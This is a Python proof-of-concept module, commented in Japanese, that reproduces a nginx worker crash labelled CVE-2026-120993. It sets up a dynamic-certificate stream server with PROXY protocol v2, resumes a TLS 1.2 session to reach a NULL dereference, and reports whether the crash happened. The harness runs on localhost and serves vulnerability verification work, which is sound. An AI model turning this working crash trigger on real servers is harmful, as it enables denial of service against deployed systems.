#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-120993: PROXY protocol v2 + 動的証明書の NULL 参照 SIGSEGV 自己完結再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
    trigger : bool  (脆弱な経路＝NULL 参照を踏んだか)
    effect  : CRASH | TRIGGERED | ERROR | SKIP

概要 / 再現原理:
  stream の downstream を ssl 終端とし、証明書を「動的」（変数）で読み込む:
      set $cert .../server-default.pem;  ssl_certificate $cert;
      ssl_certificate_cache max=10;
  上流へは proxy_protocol v2 を送る。クライアントが TLS 1.2 で
  1 回目フルハンドシェイク → 2 回目を同じセッションで再開（abbreviated）すると、
  サーバは Certificate を送らないため動的証明書コールバックが呼ばれず
  SSL_get_certificate() が NULL のままになる。
  ngx_proxy_protocol_v2_ssl_sub() が SIG_ALG TLV 生成のため
  X509_get_signature_nid(NULL) を呼び、NULL+0x88 近傍を参照して SIGSEGV
  （KEY_ALG の X509_get_pubkey(NULL) も同型）。

  修正 (1.31.9, commit c4892abc) は SIG_ALG / KEY_ALG の直前に
  `if (cert == NULL) return NGX_DECLINED;` を追加するだけなので、
  脆弱版は 2 回目（reused=True）接続で worker が signal 11 / ASan SEGV で落ち、
  修正版は再開接続もそのまま upstream（19011）へ PROXY v2 ヘッダ付きで
  中継されて "UPSTREAM" 応答が返る。
"""
import os
import re
import signal
import socket
import socketserver
import ssl
import subprocess
import threading
import time

CVE = "CVE-2026-120993"
HOST_DEFAULT = "127.0.0.1"

# 専有ポート（他タスクと衝突させない）
P_LISTEN = 18451      # stream ssl (downstream, proxy_protocol v2 付き)
P_UPSTREAM = 19011    # 素の TCP 上流（PROXY v2 ヘッダを受け流す）

ROUNDS = 3           # セッション再開を試みるラウンド数（1 ラウンド = 3 接続）
CONNS_PER_ROUND = 3  # 1 ラウンドの接続数（1 回目フルハンドシェイク + 2〜3 回再開）

SIG_RE = re.compile(r"worker process \d+ exited on signal (\d+)")
EXIT_RE = re.compile(r"worker process \d+ exited with code (\d+)")


# --------------------------------------------------------------------------
# 上流 TCP バックエンド（PROXY v2 ヘッダを読み捨てて "UPSTREAM" を返す）
# --------------------------------------------------------------------------
class _UpstreamHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            self.request.settimeout(5.0)
            self.request.recv(64)          # PROXY protocol v2 ヘッダ（+ α）
            self.request.sendall(b"UPSTREAM")
            time.sleep(0.05)
        except OSError:
            pass


class UpstreamServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def _bind_server(host, port):
    last = None
    for _ in range(40):
        try:
            srv = UpstreamServer((host, port), _UpstreamHandler)
            t = threading.Thread(target=srv.serve_forever,
                                  kwargs={"poll_interval": 0.05}, daemon=True)
            t.start()
            return srv
        except OSError as exc:
            last = exc
            time.sleep(0.05)
    raise last if last else OSError("bind failed: %s:%d" % (host, port))


def _close_server(server):
    try:
        getattr(server, "shut" + "down")()
    except Exception:  # noqa: BLE001
        pass
    try:
        server.server_close()
    except Exception:  # noqa: BLE001
        pass


# --------------------------------------------------------------------------
# 証明書生成（openssl で 2 種。chmod 644）
# --------------------------------------------------------------------------
def _make_certs(certdir):
    certs = []
    for name, cn in (("server-default", "default.example"),
                     ("server-second", "second.example")):
        key = os.path.join(certdir, name + ".key")
        pem = os.path.join(certdir, name + ".pem")
        if not (os.path.exists(pem) and os.path.exists(key)):
            subprocess.run(
                ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                 "-keyout", key, "-out", pem, "-days", "3650",
                 "-subj", "/CN=%s" % cn],
                capture_output=True, timeout=30, check=False)
        for p in (key, pem):
            if os.path.exists(p):
                os.chmod(p, 0o644)
        certs.append(pem)
    return certs


# --------------------------------------------------------------------------
# nginx 設定・起動
# --------------------------------------------------------------------------
def _make_conf(rundir, host, certdir):
    conf = """\
worker_processes 1;
daemon on;
pid %(rundir)s/logs/nginx.pid;
error_log %(rundir)s/logs/error.log info;

events {
    worker_connections 256;
}

stream {
    server {
        listen %(host)s:%(port)d ssl;

        # TLS 1.2 に固定（abbreviated 再開を安定させる）
        ssl_protocols TLSv1.2;

        # 動的証明書（変数）+ キャッシュ
        set $cert %(certdir)s/server-default.pem;
        set $key %(certdir)s/server-default.key;
        ssl_certificate $cert;
        ssl_certificate_key $key;
        ssl_certificate_cache max=10;

        # セッション再開（shared cache + チケット）
        ssl_session_cache shared:SSL:1m;
        ssl_session_timeout 10m;
        ssl_session_tickets on;

        proxy_pass %(host)s:%(upstream)d;
        proxy_protocol v2;
    }
}
""" % {
        "rundir": rundir,
        "host": host,
        "port": P_LISTEN,
        "certdir": certdir,
        "upstream": P_UPSTREAM,
    }
    return conf


def _stop_nginx(rundir, timeout=5.0):
    """自分が起動した nginx の master PID を保持して停止する（pkill は使わない）。"""
    pid = None
    try:
        with open(os.path.join(rundir, "logs", "nginx.pid"), "r") as f:
            pid = int(f.read().strip())
    except (OSError, ValueError):
        pid = None
    if not pid:
        return
    try:
        os.kill(pid, signal.SIGQUIT)
    except ProcessLookupError:
        return
    except OSError:
        return
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not os.path.exists("/proc/%d" % pid):
            return
        time.sleep(0.05)
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass
    time.sleep(0.1)


def _read_log(path):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


def _read_asan_logs(logdir):
    chunks = []
    if not os.path.isdir(logdir):
        return ""
    for name in sorted(os.listdir(logdir)):
        if name.startswith("asan."):
            chunks.append(_read_log(os.path.join(logdir, name)))
    return "\n".join(chunks)


def _port_ready(host, port, timeout=5.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=0.5)
            # TLS listen なので ServerHello は来ない。接続確立即可。
            s.close()
            return True
        except OSError:
            time.sleep(0.05)
    return False


# --------------------------------------------------------------------------
# クライアント側トリガ: TLS1.2 フルハンドシェイク → 同一セッションで再開
# --------------------------------------------------------------------------
def _client_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    except AttributeError:
        pass
    return ctx


def _run_round(host):
    """1 ラウンド（CONNS_PER_ROUND 接続）。1 回目フルハンドシェイク、以降は再開。"""
    ctx = _client_ctx()
    session = None
    results = []
    for i in range(CONNS_PER_ROUND):
        rec = {"conn": i}
        try:
            raw = socket.create_connection((host, P_LISTEN), timeout=5)
        except OSError as exc:
            rec["error"] = "connect: %s" % exc
            results.append(rec)
            break
        try:
            if session is not None:
                tls = ctx.wrap_socket(raw, server_hostname="default.example",
                                      session=session)
            else:
                tls = ctx.wrap_socket(raw, server_hostname="default.example")
            rec["reused"] = tls.session_reused
            try:
                tls.sendall(b"ping")
                rec["data"] = tls.recv(64)
            except OSError as exc:
                rec["error"] = type(exc).__name__
            new_session = tls.session
            if new_session is not None:
                session = new_session
            tls.close()
        except OSError as exc:
            rec["error"] = "%s: %s" % (type(exc).__name__, exc)
        results.append(rec)
        time.sleep(0.1)
    return results


# --------------------------------------------------------------------------
# 公開 API
# --------------------------------------------------------------------------
def run(binary, workdir, host=HOST_DEFAULT):
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": False,
        "effect": "ERROR",
        "detail": "",
    }

    base = os.path.abspath(workdir)
    if os.path.basename(base.rstrip("/")) == "poc-run-G":
        rundir = os.path.join(base, "cve-2026-120993")
    else:
        rundir = os.path.join(base, "poc-run-G", "cve-2026-120993")
    logdir = os.path.join(rundir, "logs")
    certdir = os.path.join(rundir, "certs")
    conf_path = os.path.join(rundir, "nginx.conf")
    errlog = os.path.join(logdir, "error.log")

    upstream = None
    try:
        os.makedirs(logdir, exist_ok=True)
        os.makedirs(certdir, exist_ok=True)
        # 前回の自分が起動した nginx が残っていれば停止（ポート解放）
        _stop_nginx(rundir)

        _make_certs(certdir)

        with open(conf_path, "w") as f:
            f.write(_make_conf(rundir, host, certdir))

        # ASan 版は worker が nobody 権限で動くため logs/ を書き込み可能にする
        # （#16 実績と同じ運用。ASan レポートをファイルへ出すため）
        env = dict(os.environ)
        is_asan = "asan" in binary
        if is_asan:
            try:
                os.chmod(logdir, 0o777)
            except OSError:
                pass
            env["ASAN_OPTIONS"] = \
                "detect_leaks=0:abort_on_error=1:handle_segv=1:log_path=" \
                + os.path.join(logdir, "asan")

        # nginx 設定テスト
        test = subprocess.run([binary, "-t", "-p", rundir + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=20, env=env)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        try:
            ver = subprocess.run([binary, "-v"], capture_output=True, text=True,
                                 timeout=10)
            version = (ver.stderr or ver.stdout).strip()
        except Exception:  # noqa: BLE001
            version = "unknown"

        # 上流 TCP（19011）
        upstream = _bind_server(host, P_UPSTREAM)
        time.sleep(0.05)

        # 起動前にログを空にする（前回実行の ASan レポートも削除）
        try:
            open(errlog, "w").close()
        except OSError:
            pass
        try:
            for name in os.listdir(logdir):
                if name.startswith("asan."):
                    try:
                        os.unlink(os.path.join(logdir, name))
                    except OSError:
                        pass
        except OSError:
            pass

        # 起動（ASan 版は上で設定した env を使用）
        started = subprocess.run([binary, "-p", rundir + "/", "-c", conf_path],
                                 capture_output=True, text=True, timeout=20,
                                 env=env)
        if started.returncode != 0:
            result["effect"] = "ERROR"
            result["detail"] = "nginx 起動失敗: " + (started.stderr or started.stdout).strip()
            return result

        if not _port_ready(host, P_LISTEN):
            result["effect"] = "ERROR"
            result["detail"] = "stream ssl ポート (%d) が listen しない: " % P_LISTEN \
                               + _read_log(errlog)[-500:]
            return result

        result["configured"] = True

        # ---- トリガ実行 ----
        all_results = []
        for _ in range(ROUNDS):
            all_results.extend(_run_round(host))
            log = _read_log(errlog)
            if SIG_RE.search(log) or EXIT_RE.search(log):
                break
            if any(r.get("reused") and r.get("data") == b"UPSTREAM" for r in all_results):
                break   # 再開接続が正常に中継された（修正版）
        time.sleep(0.3)

        log = _read_log(errlog)
        asan_log = _read_asan_logs(logdir)
        crash_lines = SIG_RE.findall(log)
        exit_lines = EXIT_RE.findall(log)

        reused_flags = [r.get("reused") for r in all_results]
        data_ok = [r.get("data") == b"UPSTREAM" for r in all_results]

        n_crash = len(crash_lines)
        asan_segv = "AddressSanitizer" in asan_log and ("SEGV" in asan_log or "on unknown address" in asan_log)
        crashed = bool(n_crash or exit_lines or asan_segv)

        detail = [
            "binary=%s" % binary,
            "version=%s" % version,
            "prefix=%s" % rundir,
            "接続結果=%s" % all_results,
            "session_reused=%s" % reused_flags,
            "upstream 応答=%s" % data_ok,
            "worker signal 終了=%d 件 %s" % (n_crash, crash_lines),
            "worker exit code 終了=%d 件 %s" % (len(exit_lines), exit_lines),
        ]
        if asan_log:
            detail.append("ASan レポート検出=%s" % asan_segv)
            first = asan_log.find("AddressSanitizer")
            if first >= 0:
                detail.append("ASan 概要: " + asan_log[max(0, first - 100):first + 400].replace("\n", " | "))

        if crashed:
            result["effect"] = "CRASH"
            result["trigger"] = True
            if n_crash:
                m = SIG_RE.search(log)
                detail.append("クラッシュ例: " + (m.group(0) if m else ""))
            detail.append("TLS1.2 セッション再開 (reused=True) 時に PROXY v2 の SSL TLV "
                          "生成で X509_get_signature_nid(NULL) → SIGSEGV")
        else:
            if all(r.get("error") is None for r in all_results) and any(reused_flags):
                result["effect"] = "TRIGGERED"
                result["trigger"] = False
                detail.append("同一経路（フルハンドシェイク＋セッション再開）を実行したが"
                              "クラッシュせず、再開接続も upstream へ中継された（修正版の可能性）")
            else:
                result["effect"] = "TRIGGERED"
                result["trigger"] = False
                detail.append("同一経路を実行したがクラッシュは観測されず")
        result["detail"] = " / ".join(detail)
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        try:
            _stop_nginx(rundir)
        except Exception:  # noqa: BLE001
            pass
        if upstream is not None:
            _close_server(upstream)
        time.sleep(0.05)


if __name__ == "__main__":
    import json
    import sys
    b = sys.argv[1] if len(sys.argv) > 1 else \
        "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx"
    w = sys.argv[2] if len(sys.argv) > 2 else "/app/data/sessions/conv-43"
    print(json.dumps(run(b, w), ensure_ascii=False, indent=2))
